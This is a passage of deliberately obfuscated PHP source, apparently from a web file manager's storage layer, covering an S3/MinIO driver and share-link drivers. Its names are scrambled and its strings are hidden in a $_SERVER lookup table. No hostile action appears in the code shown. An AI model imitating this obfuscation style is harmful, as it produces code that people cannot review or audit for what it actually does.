if (!$ì¡±çû™) { return !1; } $ì¡±çû™ = $this->delByBatch($õÆÜŸÉÏ[$—ñëˆ£Ğ[92]]); if (!$ì¡±çû™) { return !1; } return $this->delFile($ıæ˜êò ); } private function delByBatch($¹Ğëù×ˆ) { foreach (array_chunk($¹Ğëù×ˆ, 1000) as $ˆß¸¨®Ú) { $ÚÍ¦¡öÏ = $this->client->deleteObjects($this->bucket, $ˆß¸¨®Ú); if (!$ÚÍ¦¡öÏ) { return !1; } } return !0; } public function rename($¾¹ÂØ¢‘, $ÔÎ×œÁ) { return $this->renameObject($¾¹ÂØ¢‘, $ÔÎ×œÁ); } public function listPath($©§øä’ğ, $‘Ó¸óÜ– = false) { $ê†©³¢ú =& $_SERVER[¹Û¹Æ€]; $Ä›¦ıèå = $this->fileList($©§øä’ğ, $ê†©³¢ú[18], !0); foreach ($Ä›¦ıèå[$ê†©³¢ú[92]] as $ÊŸ…†‚À => $¸µ¸šÆ¯) { $Ä›¦ıèå[$ê†©³¢ú[92]][$ÊŸ…†‚À] = $this->folderInfo($¸µ¸šÆ¯, $‘Ó¸óÜ–, $¸µ¸šÆ¯); } foreach ($Ä›¦ıèå[$ê†©³¢ú[93]] as $ÊŸ…†‚À => $¸µ¸šÆ¯) { $Ä›¦ıèå[$ê†©³¢ú[93]][$ÊŸ…†‚À] = $this->fileInfo($¸µ¸šÆ¯[$ê†©³¢ú[42]], $‘Ó¸óÜ–, $¸µ¸šÆ¯); } return $Ä›¦ıèå; } protected function infoChildren($ÚÃç”½ƒ, &$²ë¼´€¤) { $ÄÑíøöô =& $_SERVER[¹Û¹Æ€]; $÷µäï›ì = $this->fileList($ÚÃç”½ƒ, $ÄÑíøöô[22], !0); $²ë¼´€¤[$ÄÑíøöô[88]] += count($÷µäï›ì[$ÄÑíøöô[92]]); $²ë¼´€¤[$ÄÑíøöô[87]] += count($÷µäï›ì[$ÄÑíøöô[93]]); foreach ($÷µäï›ì[$ÄÑíøöô[93]] as $éï‰úçê) { if (!$éï‰úçê || !$éï‰úçê[$ÄÑíøöô[86]]) { continue; } $²ë¼´€¤[$ÄÑíøöô[86]] += $éï‰úçê[$ÄÑíøöô[86]]; } } private function fileInfo($•³Ÿë¥, $áãâç¬ = false, $‘·’™ Ü = array()) { $ùÕò—ğ– =& $_SERVER[¹Û¹Æ€]; $ÑÄÓĞ = array($ùÕò—ğ–[42] => $this->pathThis($•³Ÿë¥), $ùÕò—ğ–[94] => $this->getPathOuter($•³Ÿë¥), $ùÕò—ğ–[43] => $ùÕò—ğ–[209], $ùÕò—ğ–[184] => $this->ext($•³Ÿë¥), $ùÕò—ğ–[86] => isset($‘·’™ Ü[$ùÕò—ğ–[86]]) ? $‘·’™ Ü[$ùÕò—ğ–[86]] : 0); if ($áãâç¬) { return $ÑÄÓĞ; } $ÑÄÓĞ[$ùÕò—ğ–[210]] = $ÑÄÓĞ[$ùÕò—ğ–[95]] = 0; $ÑÄÓĞ[$ùÕò—ğ–[211]] = $ÑÄÓĞ[$ùÕò—ğ–[212]] = !0; if (empty($‘·’™ Ü)) { $‘·’™ Ü = $this->objectMeta($•³Ÿë¥); if (!$‘·’™ Ü) { return $ÑÄÓĞ; } } if (isset($‘·’™ Ü[$ùÕò—ğ–[213]])) { $ÑÄÓĞ[$ùÕò—ğ–[95]] = $‘·’™ Ü[$ùÕò—ğ–[213]]; } if (isset($‘·’™ Ü[$ùÕò—ğ–[86]])) { $ÑÄÓĞ[$ùÕò—ğ–[86]] = $‘·’™ Ü[$ùÕò—ğ–[86]]; } return $ÑÄÓĞ; } private function folderInfo($ùòä‰Å, $‹ÙÏÏ§‚ = false, $×šˆ×‰¨ = array()) { $•ŞîÀÓ =& $_SERVER[¹Û¹Æ€]; $ñ¤±šú‘ = array($•ŞîÀÓ[42] => $this->pathThis($ùòä‰Å), $•ŞîÀÓ[94] => $this->getPathOuter($•ŞîÀÓ[18] . $ùòä‰Å), $•ŞîÀÓ[43] => $•ŞîÀÓ[85]); if ($‹ÙÏÏ§‚) { return $ñ¤±šú‘; } $ñ¤±šú‘[$•ŞîÀÓ[210]] = $ñ¤±šú‘[$•ŞîÀÓ[95]] = 0; $ñ¤±šú‘[$•ŞîÀÓ[211]] = $ñ¤±šú‘[$•ŞîÀÓ[212]] = !0; if ($ùòä‰Å == $•ŞîÀÓ[22]) { return $ñ¤±šú‘; } if (empty($×šˆ×‰¨)) { $×šˆ×‰¨ = $this->objectMeta(trim($ùòä‰Å, $•ŞîÀÓ[18]) . $•ŞîÀÓ[18]); } if (isset($×šˆ×‰¨[$•ŞîÀÓ[213]])) { $ñ¤±šú‘[$•ŞîÀÓ[210]] = $×šˆ×‰¨[$•ŞîÀÓ[213]]; } return $ñ¤±šú‘; } private function fileList($—ãËÆè¹, $øÍ„‹È‰ = '', $ş•ñ®µâ = 0) { $éìÇ ŸÚ =& $_SERVER[¹Û¹Æ€]; $ÖØºˆ®¨ = rtrim($—ãËÆè¹, $éìÇ ŸÚ[18]) . $éìÇ ŸÚ[18]; $ã€¼ƒ• = $this->listObjs($ÖØºˆ®¨, null, null, $øÍ„‹È‰); if (!$ã€¼ƒ•) { return array($éìÇ ŸÚ[92] => array(), $éìÇ ŸÚ[93] => array()); } $À¤ô³º = $¡£¡®— = array(); foreach ($ã€¼ƒ•[$éìÇ ŸÚ[214]] as $Ôò´çÏ¸) { $¬ßÆàà = $Ôò´çÏ¸[$éìÇ ŸÚ[42]]; if ($¬ßÆàà == $ÖØºˆ®¨) { continue; } $œêúÌÀà = isset($Ôò´çÏ¸[$éìÇ ŸÚ[86]]) ? $Ôò´çÏ¸[$éìÇ ŸÚ[86]] : 0; $…õ½œŸ = $œêúÌÀà == 0 && substr($¬ßÆàà, strlen($¬ßÆàà) - 1, 1) == $éìÇ ŸÚ[18] ? !0 : !1; $this->cacheMethodInfoSet($¬ßÆàà, $…õ½œŸ, $Ôò´çÏ¸); if ($…õ½œŸ) { $À¤ô³º[] = $¬ßÆàà; continue; } $¡£¡®—[] = $ş•ñ®µâ ? $Ôò´çÏ¸ : $¬ßÆàà; } foreach ($ã€¼ƒ•[$éìÇ ŸÚ[215]] as $Ôò´çÏ¸) { $À¤ô³º[] = $Ôò´çÏ¸[$éìÇ ŸÚ[42]]; $this->cacheMethodInfoSet($Ôò´çÏ¸[$éìÇ ŸÚ[42]], !0); } $this->cacheMethodInfoSet($—ãËÆè¹, !0); return array($éìÇ ŸÚ[92] => $À¤ô³º, $éìÇ ŸÚ[93] => $¡£¡®—); } private function listObjs($‚óäé‚¤, $×Î¢Íœ½ = null, $è”ÚåÜÈ = null, $ìØ¶´¾® = null) { $ˆß¨åÛŞ =& $_SERVER[¹Û¹Æ€]; $‚óäé‚¤ = trim($‚óäé‚¤, $ˆß¨åÛŞ[18]); $ª¶¬‘œÒ = empty($‚óäé‚¤) && $‚óäé‚¤ !== $ˆß¨åÛŞ[207] ? $ˆß¨åÛŞ[22] : $‚óäé‚¤ . $ˆß¨åÛŞ[18]; return $this->client->getBucket($this->bucket, $ª¶¬‘œÒ, $×Î¢Íœ½, $è”ÚåÜÈ, $ìØ¶´¾®, !0); } public function has($“¾Ÿ ¿, $“¿Ä»¬ = false, $ÇÅ•ÍÒø = true) { $èó©º =& $_SERVER[¹Û¹Æ€]; $“¾Ÿ ¿ = trim($“¾Ÿ ¿, $èó©º[18]); $ÑÃû•ŞË = empty($“¾Ÿ ¿) && $“¾Ÿ ¿ !== $èó©º[207] ? $èó©º[22] : $“¾Ÿ ¿ . $èó©º[18]; $âÃ”‰Ò¬ = null; $ÌóÓÍ = 500; $Ò‹‰Ş’ª = $èó©º[18]; $ú¦ùÊä• = $Î¶éÃ¢Ï = array(); while (!0) { $…§ë¼ô¸ = $this->listObjs($“¾Ÿ ¿, $âÃ”‰Ò¬, $ÌóÓÍ, $Ò‹‰Ş’ª); if (!$…§ë¼ô¸) { break; } $âÃ”‰Ò¬ = $…§ë¼ô¸[$èó©º[216]]; $ºåçı÷é = $…§ë¼ô¸[$èó©º[214]]; $¿ºñÔ”† = $…§ë¼ô¸[$èó©º[215]]; if (empty($ºåçı÷é) && empty($¿ºñÔ”†)) { break; } if (count($ºåçı÷é) == 1 && $ºåçı÷é[0][$èó©º[42]] == $ÑÃû•ŞË) { break; } if ($“¿Ä»¬) { if (count($ºåçı÷é)) { $ºåçı÷é = array_column($ºåçı÷é, $èó©º[42]); $ú¦ùÊä• = array_merge($ú¦ùÊä•, $ºåçı÷é); } if (count($¿ºñÔ”†)) { $¿ºñÔ”† = array_column($¿ºñÔ”†, $èó©º[42]); $Î¶éÃ¢Ï = array_merge($Î¶éÃ¢Ï, $¿ºñÔ”†); } if ($âÃ”‰Ò¬ === null) { break; } continue; } if ($ÇÅ•ÍÒø) { if (!empty($ºåçı÷é)) { if (count($ºåçı÷é) > 1 || isset($ºåçı÷é[0][$èó©º[42]]) && $ºåçı÷é[0][$èó©º[42]] != $ÑÃû•ŞË) { return !0; } } } else { if (!empty($¿ºñÔ”†)) { return !0; } } if ($âÃ”‰Ò¬ === null) { break; } } if ($“¿Ä»¬) { $ú¦ùÊä• = array_diff($ú¦ùÊä•, array($ÑÃû•ŞË)); $ú¦ùÊä• = count(array_unique($ú¦ùÊä•)); $Î¶éÃ¢Ï = count(array_unique($Î¶éÃ¢Ï)); return array($èó©º[217] => $ú¦ùÊä•, $èó©º[218] => $Î¶éÃ¢Ï); } return !1; } public function listAll($ÜèĞ¾”) { $‰…ìóÏÑ =& $_SERVER[¹Û¹Æ€]; $üÎè®œÕ = $this->fileList($ÜèĞ¾”, $‰…ìóÏÑ[22], !0); $ëÊ¹¯ŠÊ = array(); foreach ($üÎè®œÕ[$‰…ìóÏÑ[93]] as $Ñü¦ğË«) { $ëÊ¹¯ŠÊ[$Ñü¦ğË«[$‰…ìóÏÑ[42]]] = $Ñü¦ğË«[$‰…ìóÏÑ[86]]; } foreach ($üÎè®œÕ[$‰…ìóÏÑ[92]] as $Ñü¦ğË«) { if (is_string($Ñü¦ğË«)) { $ëÊ¹¯ŠÊ[$Ñü¦ğË«] = 0; } } return $this->listAllFiles($ÜèĞ¾”, array_keys($ëÊ¹¯ŠÊ), $ëÊ¹¯ŠÊ); } public function canRead($˜Şå—™÷) { $‰¨¿×Á =& $_SERVER[¹Û¹Æ€]; $ÍËÈÈ„ = $this->client->getAccessControlPolicy($this->bucket, $˜Şå—™÷); if (!$ÍËÈÈ„) { return !1; } return in_array($ÍËÈÈ„, array($‰¨¿×Á[219], $‰¨¿×Á[220], $‰¨¿×Á[221])) ? !0 : !1; } public function canWrite($´øÊâÁ) { $à§·à”Õ =& $_SERVER[¹Û¹Æ€]; $Àì•¥ş = $this->client->getAccessControlPolicy($this->bucket, $´øÊâÁ); if (!$Àì•¥ş) { return !1; } return in_array($Àì•¥ş, array($à§·à”Õ[219], $à§·à”Õ[220])) ? !0 : !1; } public function getContent($í°¤×½«) { return $this->client->getObject($this->bucket, $í°¤×½«); } public function setContent($ç‚¥ÂÏ´, $é©ığµò = '', $ÖÎ™ñ‡‰ = false) { $ÕãŠŒ›÷ =& $_SERVER[¹Û¹Æ€]; $ç‚¥ÂÏ´ = $ÖÎ™ñ‡‰ ? trim($ç‚¥ÂÏ´, $ÕãŠŒ›÷[18]) . $ÕãŠŒ›÷[18] : $ç‚¥ÂÏ´; $Åµ¦Øé = get_file_mime(get_path_ext($ç‚¥ÂÏ´)); $“ñæÖø = $this->client->putObject($é©ığµò, $this->bucket, $ç‚¥ÂÏ´, $ÕãŠŒ›÷[208], array(), $Åµ¦Øé); if (!$“ñæÖø) { return !1; } if ($ÖÎ™ñ‡‰) { return !0; } $this->cacheMethod(null, null); $“ñæÖø = $this->copyFile($ç‚¥ÂÏ´, $ç‚¥ÂÏ´, array($ÕãŠŒ›÷[222] => $“ñæÖø[$ÕãŠŒ›÷[223]])); return $“ñæÖø ? !0 : !1; } public function fileSubstr($¶„ÓıÌ, $ñÒü¾æ«, $ñ¾÷ ôØ) { $ôçûç¬» = $ñÒü¾æ« + $ñ¾÷ ôØ - 1; return $this->client->getObject($this->bucket, $¶„ÓıÌ, array($_SERVER[¹Û¹Æ€][224] => "\x62\171\x74\x65\163\75{$ñÒü¾æ«}\55{$ôçûç¬»}")); } public function upload($®ëµèÒ , $‰ñİè€, $”Î¿ê‚Ö = false, $³ìØÊã = REPEAT_REPLACE) { $ˆ ¥öÆ =& $_SERVER[¹Û¹Æ€]; $×ÌÓÒßá = array($ˆ ¥öÆ[222] => @md5_file($‰ñİè€)); $Ï³¶öŠã = array($ˆ ¥öÆ[225] => get_file_mime(get_path_ext($®ëµèÒ ))); if (IO::size($‰ñİè€) <= 1024 * 1024 * 200) { $÷Î»Ûàˆ = $this->client->putObjectFile($‰ñİè€, $this->bucket, $®ëµèÒ , $ˆ ¥öÆ[208], $×ÌÓÒßá, $Ï³¶öŠã); return !empty($÷Î»Ûàˆ) ? $this->getPathOuter($®ëµèÒ ) : !1; } $Òò ö¬” = $this->client->multiUploadObject($‰ñİè€, $this->bucket, trim($®ëµèÒ , $ˆ ¥öÆ[18]), $×ÌÓÒßá, $Ï³¶öŠã); return $Òò ö¬” ? $this->getPathOuter($®ëµèÒ ) : !1; } public function download($öëÆ°¹¯, $üÀê¦) { if (!@is_dir($this->pathFather($üÀê¦)) && !IO::mkdir($this->pathFather($üÀê¦))) { return !1; } $ò®ƒÓ…Ÿ = $this->client->getObject($this->bucket, $öëÆ°¹¯, array(), $üÀê¦); return $ò®ƒÓ…Ÿ !== !1 ? $üÀê¦ : !1; } public function link($ÚÓÓ±ùÒ, $™‡‚›– = array()) { $üïÏ¾• =& $_SERVER[¹Û¹Æ€]; if ($this->signVer == $üïÏ¾•[226]) { return $this->client->getAuthenticatedURL($this->bucket, $ÚÓÓ±ùÒ, 3600 * 12, $™‡‚›–); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÚÓÓ±ùÒ, $üïÏ¾•[18]), 3600 * 12, $this->region, array(), !0, $™‡‚›–); } public function fileOut($îÔñ‘ÙÈ, $÷„‡„Û” = false, $»›ŞÔÛü = false, $ªí¾…Ø¢ = '') { $‚í¨ï¯Â =& $_SERVER[¹Û¹Æ€]; if ($this->isFileOutServer()) { return $this->fileOutServer($îÔñ‘ÙÈ, $÷„‡„Û”, $»›ŞÔÛü, $ªí¾…Ø¢); } if (!$»›ŞÔÛü) { $»›ŞÔÛü = $this->pathThis($îÔñ‘ÙÈ); } $á©ùí“  = get_file_mime(get_path_ext($»›ŞÔÛü)); if ($á©ùí“  == $‚í¨ï¯Â[227]) { return parent::fileOut($îÔñ‘ÙÈ, $÷„‡„Û”, $»›ŞÔÛü, $ªí¾…Ø¢); } $ãÑø©Õá = array($‚í¨ï¯Â[228] => $á©ùí“ ); if ($÷„‡„Û”) { $ãÑø©Õá[$‚í¨ï¯Â[229]] = $‚í¨ï¯Â[230] . rawurlencode($»›ŞÔÛü); } else { } $ÓíÉ³ = $this->link($îÔñ‘ÙÈ, $ãÑø©Õá); $this->fileOutLink($ÓíÉ³); } public function fileOutServer($³´ ™‹õ, $Í´º µÅ = false, $ºõşä½° = false, $ÑÄÖÕöÆ = '') { parent::fileOut($³´ ™‹õ, $Í´º µÅ, $ºõşä½°, $ÑÄÖÕöÆ); } public function fileOutImageServer($†ÌØè©´, $Ğî¬§³¹ = 250) { parent::fileOutImage($†ÌØè©´, $Ğî¬§³¹); } public function hashMd5($áŒßÎƒÁ, $õÚ­ûéØ = '') { $Ï˜ÅßÂ§ =& $_SERVER[¹Û¹Æ€]; $±§š‘¯¶ = $this->objectMeta($áŒßÎƒÁ); if (!$±§š‘¯¶) { return !1; } $õÚ­ûéØ = $õÚ­ûéØ ? $õÚ­ûéØ : _get($±§š‘¯¶, $Ï˜ÅßÂ§[231]); $õÚ­ûéØ = $õÚ­ûéØ ? $õÚ­ûéØ : _get($±§š‘¯¶, $Ï˜ÅßÂ§[223], $Ï˜ÅßÂ§[22]); return $õÚ­ûéØ; } public function uploadFormData($œ”äáË°, $¬®”õ¬Ş = 3600) { $Í›ÔñıÀ =& $_SERVER[¹Û¹Æ€]; $­²“ê¹ƒ = $this->pathFather($œ”äáË°); $·²³Ä¶­ = $this->client->getHttpUploadPostParams($this->bucket, $­²“ê¹ƒ, $Í›ÔñıÀ[208], $¬®”õ¬Ş); return array_merge((array) $·²³Ä¶­, array($Í›ÔñıÀ[191] => $this->getHost())); } public function multiUploadFormData($™”ô—‰´, $×å”¶°Â = 3600) { $ê’ìİ¬ =& $_SERVER[¹Û¹Æ€]; $Ú¥¸Öå = gmdate($ê’ìİ¬[232]); $¶çÊ‰Ë“ = array(); $íÅ›œÅ¡ = $this->client->getUploadId($this->bucket, $™”ô—‰´, $¶çÊ‰Ë“); if (!$íÅ›œÅ¡) { return !1; } return array($ê’ìİ¬[233] => $íÅ›œÅ¡, $ê’ìİ¬[191] => $this->getHost() . $ê’ìİ¬[18] . $this->pathEncode($™”ô—‰´), $ê’ìİ¬[234] => $Ú¥¸Öå, $ê’ìİ¬[104] => $™”ô—‰´); } public function multiUploadAuthData($’—ªˆÉŒ, $› ”Á÷Æ = array()) { $ÈŞÄ¾ÎÔ =& $_SERVER[¹Û¹Æ€]; $ø¬ÖÎ¢Õ = isset($› ”Á÷Æ[$ÈŞÄ¾ÎÔ[234]]) ? $› ”Á÷Æ[$ÈŞÄ¾ÎÔ[234]] : gmdate($ÈŞÄ¾ÎÔ[232]); $ëÇ·û½Ø = isset($› ”Á÷Æ[$ÈŞÄ¾ÎÔ[184]]) ? $› ”Á÷Æ[$ÈŞÄ¾ÎÔ[184]] : $ÈŞÄ¾ÎÔ[22]; $’ßççªğ = $› ”Á÷Æ[$ÈŞÄ¾ÎÔ[104]]; unset($› ”Á÷Æ[$ÈŞÄ¾ÎÔ[104]]); if (isset($› ”Á÷Æ[$ÈŞÄ¾ÎÔ[235]])) { $› ”Á÷Æ[$ÈŞÄ¾ÎÔ[234]] = $ø¬ÖÎ¢Õ; return $this->listUploadParts($’ßççªğ, $› ”Á÷Æ); } $—µÂì‚ = array($ÈŞÄ¾ÎÔ[236], $ÈŞÄ¾ÎÔ[22], $ÈŞÄ¾ÎÔ[130], $ÈŞÄ¾ÎÔ[22], "\170\55\x61\155\172\x2d\x64\x61\164\x65\72{$ø¬ÖÎ¢Õ}", $ÈŞÄ¾ÎÔ[18] . $this->bucket . $ÈŞÄ¾ÎÔ[18] . $this->pathEncode($’ßççªğ) . $ëÇ·û½Ø); if (strpos($ëÇ·û½Ø, $ÈŞÄ¾ÎÔ[237]) === 0) { $—µÂì‚[0] = $ÈŞÄ¾ÎÔ[238]; } if (isset($› ”Á÷Æ[$ÈŞÄ¾ÎÔ[239]]) && $› ”Á÷Æ[$ÈŞÄ¾ÎÔ[239]] == $ÈŞÄ¾ÎÔ[240]) { $—µÂì‚[0] = $ÈŞÄ¾ÎÔ[240]; } $ÌäàªœÁ = implode($ÈŞÄ¾ÎÔ[12], $—µÂì‚); $óÖÓ’Œ× = base64_encode(hash_hmac($ÈŞÄ¾ÎÔ[241], $ÌäàªœÁ, $this->secret, !0)); $ê¹Ç îè = $ÈŞÄ¾ÎÔ[242] . $this->accessKey . $ÈŞÄ¾ÎÔ[4] . $óÖÓ’Œ×; if (strpos($ëÇ·û½Ø, $ÈŞÄ¾ÎÔ[237]) === 0) { return array($ÈŞÄ¾ÎÔ[243] => $ê¹Ç îè, $ÈŞÄ¾ÎÔ[234] => $ø¬ÖÎ¢Õ); } return $ê¹Ç îè; } public function listUploadParts($²ñŸÂÚÀ, $ñÄ‰ôàò = array()) { $ÆÂ‡²Ó =& $_SERVER[¹Û¹Æ€]; $š–Ş‹¸Ù = str_replace($ÆÂ‡²Ó[244], $ÆÂ‡²Ó[22], $ñÄ‰ôàò[$ÆÂ‡²Ó[184]]); $ÒÚ±„ì = $this->client->listParts($this->bucket, $²ñŸÂÚÀ, $š–Ş‹¸Ù); if (!$ÒÚ±„ì) { return !1; } unset($ñÄ‰ôàò[$ÆÂ‡²Ó[235]], $ñÄ‰ôàò[$ÆÂ‡²Ó[239]]); $ñÄ‰ôàò[$ÆÂ‡²Ó[104]] = $²ñŸÂÚÀ; $Şø˜“´ = $this->multiUploadAuthData($²ñŸÂÚÀ, $ñÄ‰ôàò); if (empty($Şø˜“´)) { return !1; } return array($ÆÂ‡²Ó[243] => $Şø˜“´, $ÆÂ‡²Ó[234] => $ñÄ‰ôàò[$ÆÂ‡²Ó[234]], $ÆÂ‡²Ó[245] => $ÒÚ±„ì); } public function getHost() { return parent::getHost() . $_SERVER[¹Û¹Æ€][18] . $this->bucket; } public function size($Şª¤©ë) { $´í¼Ã” = $this->objectMeta($Şª¤©ë); return $´í¼Ã” ? $´í¼Ã”[$_SERVER[¹Û¹Æ€][86]] : 0; } public function info($äÂòÀĞƒ) { if ($this->isFolder($äÂòÀĞƒ)) { return $this->folderInfo($äÂòÀĞƒ); } else { if ($this->isFile($äÂòÀĞƒ)) { return $this->fileInfo($äÂòÀĞƒ); } } return !1; } public function exist($ˆÖ‹ƒà) { return $this->isFile($ˆÖ‹ƒà) || $this->isFolder($ˆÖ‹ƒà); } public function isFile($İÒõ¼ûè) { return !$this->isFolder($İÒõ¼ûè) && $this->objectMeta($İÒõ¼ûè); } public function isFolder($Ûö˜‡ŸÁ) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][175], $Ûö˜‡ŸÁ); } protected function objectMeta($İ ó›œ†) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][177], $İ ó›œ†); } protected function _objectMeta($šå Ôü) { $Áƒâä™ä =& $_SERVER[¹Û¹Æ€]; $šå Ôü = rtrim($šå Ôü, $Áƒâä™ä[18]); try { $Œõ”§šÓ = $this->client->getObjectInfo($this->bucket, $šå Ôü); if (!isset($Œõ”§šÓ[$Áƒâä™ä[231]]) && isset($Œõ”§šÓ[$Áƒâä™ä[246]])) { $Œõ”§šÓ[$Áƒâä™ä[231]] = $Œõ”§šÓ[$Áƒâä™ä[246]]; } } catch (Exception $Ï”×ĞÚí) { $Œõ”§šÓ = !1; } if (!$Œõ”§šÓ) { } return $Œõ”§šÓ; } protected function _isFolder($ñÅÊé¼á) { $Ÿ®óåßƒ =& $_SERVER[¹Û¹Æ€]; $ñÅÊé¼á = rtrim($ñÅÊé¼á, $Ÿ®óåßƒ[18]); if ($ñÅÊé¼á == $Ÿ®óåßƒ[22] || $ñÅÊé¼á == $Ÿ®óåßƒ[18]) { return !0; } $ïĞñÉí‰ = $this->client->getBucket($this->bucket, $ñÅÊé¼á, null, 1); if (empty($ïĞñÉí‰[$Ÿ®óåßƒ[214]])) { return !1; } $±‹®›Í = $ïĞñÉí‰[$Ÿ®óåßƒ[214]][0][$Ÿ®óåßƒ[42]]; return stripos($±‹®›Í, $ñÅÊé¼á . $Ÿ®óåßƒ[18]) === 0 ? !0 : !1; if (substr($±‹®›Í, -1) == $Ÿ®óåßƒ[18]) { return !0; } if (get_path_this($±‹®›Í) == get_path_this($ñÅÊé¼á)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($«Ñ®Ù) { parent::__construct($«Ñ®Ù); $this->signatureVersion($_SERVER[¹Û¹Æ€][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto eÔ¹‡ˆ„; cÜèòËî³å: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¯ÆºïÔ×) { $this->pathParse = $¯ÆºïÔ×; $this->model = Model($_SERVER[¹Û¹Æ€][1333]); } protected function infoParse($†Ğ, $ãÕì“—ú = false, $û¥¬ÄŸ¨ = false) { $‘–‚°“– =& $_SERVER[¹Û¹Æ€]; return Action($‘–‚°“–[1172])->sharePathInfo($this->pathParse[$‘–‚°“–[94]], !0, $ãÕì“—ú); } public function listPath($öêğ¢”, $¢“°ÔçŸ = false) { $Ÿ’ÔêŠÃ =& $_SERVER[¹Û¹Æ€]; $‡¦³¤¦¨ = parent::listPath($öêğ¢”, $¢“°ÔçŸ); if (!$‡¦³¤¦¨) { return $‡¦³¤¦¨; } if (is_array($‡¦³¤¦¨[$Ÿ’ÔêŠÃ[1342]])) { $‡¦³¤¦¨[$Ÿ’ÔêŠÃ[1342]] = Action($Ÿ’ÔêŠÃ[1172])->shareItemInfo($‡¦³¤¦¨[$Ÿ’ÔêŠÃ[1342]]); } foreach ($‡¦³¤¦¨ as $€¦ÜãÙ => $ª±úæº—) { if (!in_array($€¦ÜãÙ, array($Ÿ’ÔêŠÃ[93], $Ÿ’ÔêŠÃ[92]))) { continue; } foreach ($ª±úæº— as $º”üá§µ => $âÁ…”Ñ) { $‡¦³¤¦¨[$€¦ÜãÙ][$º”üá§µ] = Action($Ÿ’ÔêŠÃ[1172])->shareItemInfo($âÁ…”Ñ); } } return $‡¦³¤¦¨; } public function listAll($“ğ‘Ğ¬) { $æÆÇÑ†† =& $_SERVER[¹Û¹Æ€]; $ƒ”Áêï = IO::info($this->pathParse[$æÆÇÑ††[94]]); if (!$ƒ”Áêï) { return array(); } $¬ÙÖÓğ = $this->model->listAll($“ğ‘Ğ¬); foreach ($¬ÙÖÓğ as &$óŸúé÷ì) { $óŸúé÷ì[$æÆÇÑ††[96]] = Action($æÆÇÑ††[1172])->shareItemInfo($óŸúé÷ì[$æÆÇÑ††[96]]); } unset($óŸúé÷ì); return $¬ÙÖÓğ; } } class PathDriverDriverShareItem { public function __construct($ÄÄ«ËÀ) { $this->pathParse = $ÄÄ«ËÀ; } public function __call($¨¿öŒøÇ, $„»ğ¡åï) { $ÁşçíÄƒ =& $_SERVER[¹Û¹Æ€]; if (method_exists($this, $¨¿öŒøÇ)) { return; } $±ãÜÚ = call_user_func_array(array($ÁşçíÄƒ[1343], $¨¿öŒøÇ), $„»ğ¡åï); $¢ó»œÄ¥ = array($ÁşçíÄƒ[1344], $ÁşçíÄƒ[1345], $ÁşçíÄƒ[1346], $ÁşçíÄƒ[1347], $ÁşçíÄƒ[564], $ÁşçíÄƒ[566], $ÁşçíÄƒ[1348], $ÁşçíÄƒ[117], $ÁşçíÄƒ[1349], $ÁşçíÄƒ[1350]); if (in_array($¨¿öŒøÇ, $¢ó»œÄ¥)) { $±ãÜÚ = $this->getPathOuter($±ãÜÚ); } return $±ãÜÚ; } public function copy($êÁ´¢Åø, $ºÌà¾·å, $àÙÖ²Ç¼ = false, $Ï™‡Û¡ = false) { return $this->copyMove($êÁ´¢Åø, $ºÌà¾·å, $àÙÖ²Ç¼, $_SERVER[¹Û¹Æ€][564], $Ï™‡Û¡); } public function move($Ó¾ºÇ›İ, $üà§ÙıÏ, $‡ïÖì¡Ÿ = false, $Å³¡èŠ = false) { return $this->copyMove($Ó¾ºÇ›İ, $üà§ÙıÏ, $‡ïÖì¡Ÿ, $_SERVER[¹Û¹Æ€][566], $Å³¡èŠ); } private function copyMove($Á¢î“‘‹, $û÷ÍÔèÅ, $¤ Ë¥Š¦, $ş…”¿İ£, $‘í·º• = false) { $ÒŒªÁëÄ =& $_SERVER[¹Û¹Æ€]; $Ü²¹»ëÄ = $û÷ÍÔèÅ; $ëÌİĞ¢À = IO::driverMake($û÷ÍÔèÅ); if ($ëÌİĞ¢À->pathParse[$ÒŒªÁëÄ[1148]]) { $û÷ÍÔèÅ = $ëÌİĞ¢À->pathParse[$ÒŒªÁëÄ[1148]]; } else { $û÷ÍÔèÅ = $Ü²¹»ëÄ; } $–ãİ²¨á = IO::copyMove($Á¢î“‘‹, $û÷ÍÔèÅ, $¤ Ë¥Š¦, $ş…”¿İ£, $‘í·º•); $–ãİ²¨á = $this->getPathOuter($–ãİ²¨á); return $–ãİ²¨á; } public function pathThis($£†úşæ±) { return get_path_this($this->pathParse[$_SERVER[¹Û¹Æ€][94]]); } public function pathFather($”÷¯÷Ë†) { return get_path_father($this->pathParse[$_SERVER[¹Û¹Æ€][94]]); } public function iconvSystem($Û£†…ë”) { return $Û£†…ë”; } protected function infoParse($•õìÆçÍ, $¾ì–Ú‡µ = false) { $•ı¸„ìé =& $_SERVER[¹Û¹Æ€]; $¥î›Û§ = $this->pathParse[$•ı¸„ìé[496]][$•ı¸„ìé[1173]] . $this->pathParse[$•ı¸„ìé[1166]]; if ($¾ì–Ú‡µ) { $‚¸¨§¦ğ = IO::infoWithChildren($¥î›Û§); } else { $‚¸¨§¦ğ = IO::info($¥î›Û§); } $å³¸´î€ = $this->pathParse[$•ı¸„ìé[496]]; return Action($•ı¸„ìé[1341])->_shareItemeParse($‚¸¨§¦ğ, $å³¸´î€); } public function listAll($€Æóî§ä) { $òĞ´üÕ =& $_SERVER[¹Û¹Æ€]; $Ø”ø… = IO::listAll($€Æóî§ä); $¼®×«Å = $this->pathParse[$òĞ´üÕ[496]]; foreach ($Ø”ø… as &$ùãÙÂü’) { check_abort(); $õ€„´É× = IO::info($ùãÙÂü’[$òĞ´üÕ[94]]); $õ€„´É× = is_array($õ€„´É×) ? $õ€„´É× : array(); $ùãÙÂü’ = array_merge($õ€„´É×, $ùãÙÂü’); $ùãÙÂü’[$òĞ´üÕ[96]] = Action($òĞ´üÕ[1341])->_shareItemeParse($ùãÙÂü’, $¼®×«Å); } unset($ùãÙÂü’); return $Ø”ø…; } public function getPathOuter($†ƒÂøá) { $ùÑ”‡ó¶ =& $_SERVER[¹Û¹Æ€]; $¹ô”Ó˜Ç = KodIO::parse($†ƒÂøá); if ($¹ô”Ó˜Ç[$ùÑ”‡ó¶[43]] == KodIO::KOD_SHARE_ITEM) { return $¹ô”Ó˜Ç[$ùÑ”‡ó¶[94]]; } $¿şœ«¶ = KodIO::clear($†ƒÂøá); $â·á¼¼¤ = 